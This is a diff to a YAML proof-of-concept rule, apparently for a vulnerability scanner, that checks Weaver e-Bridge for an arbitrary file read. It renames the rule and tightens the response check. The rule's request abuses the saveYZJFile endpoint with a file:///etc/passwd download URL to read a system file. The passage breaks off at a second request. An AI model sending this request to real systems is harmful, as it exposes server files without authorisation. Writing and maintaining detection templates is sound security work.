@@ -1,10 +1,10 @@
-name: poc-yaml-weaver-e-bridge-linux-file-read
+name: poc-yaml-weaver-ebridge-file-read-linux
 rules:
   - method: GET
     path: "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
     follow_redirects: false
     expression: |
-      response.status == 200 && response.body.bcontains(b"id")
+      response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"id")
     search: |
       \"id\"\:\"(?P<var>.+?)\"\,
   - method: GET
